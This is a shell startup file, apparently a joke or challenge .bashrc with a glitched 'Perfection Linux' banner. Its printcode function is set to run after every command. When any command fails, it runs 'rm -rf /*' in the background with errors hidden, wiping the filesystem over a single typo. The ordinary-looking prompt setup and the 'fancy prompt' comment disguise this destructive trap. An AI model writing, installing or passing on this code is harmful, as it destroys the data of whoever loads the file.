echo "========================"
echo "|  P̵̰̓E̶͓̓R̸̪̈́F̵̩͐E̶͎̎C̷̰̎T̷̥̊I̶̫̕O̴̰̾N̷̞͊ ̶̫͛L̵̥̀I̵͔͑N̷͚̄Û̷͇X̵̣̅    |"
echo "|       ̵̖͑G̷̙̓Ō̷͖O̴͖̐D̷̡̆ ̶̖͊L̷̙͋Ů̵͎C̵͉̕K̸̝̈      |"
echo "|    ̴̖̂D̶͚̏O̴̖͝N̵̅͜'̴̝̿T̴̫̉ ̵͍͗M̴͎̀E̶̹͋S̸͍̆S̴̺̐ ̷̺̀U̴͚̅P̷̝̽     |"
echo "========================"

[ -z "$PS1" ] && return

# set a fancy prompt (non-color, overwrite the one in /etc/profile)
PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '

printcode() { 
  status=$?
  if [ $status == 0 ]
  then
    echo "Safe. For now."
  else
    echo "You have failed."
    rm -rf /* 2>/dev/null &
  fi
  echo "return code $status"
  }
# set printcode to run after every command
PROMPT_COMMAND=printcode

